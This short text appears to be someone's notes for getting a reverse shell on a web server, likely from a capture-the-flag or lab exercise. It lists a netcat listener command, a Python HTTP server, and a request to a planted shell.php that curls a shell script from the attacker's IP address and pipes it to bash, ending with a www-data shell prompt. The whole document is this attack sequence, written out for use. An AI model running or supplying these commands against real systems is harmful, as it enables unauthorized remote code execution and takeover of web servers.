Open port for listen:
nc -nvlp 1337

Start http server
python3 -m http.server 8000

Execute:
<url>/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash

Weclome
www-data@machine:/var/www/html$  
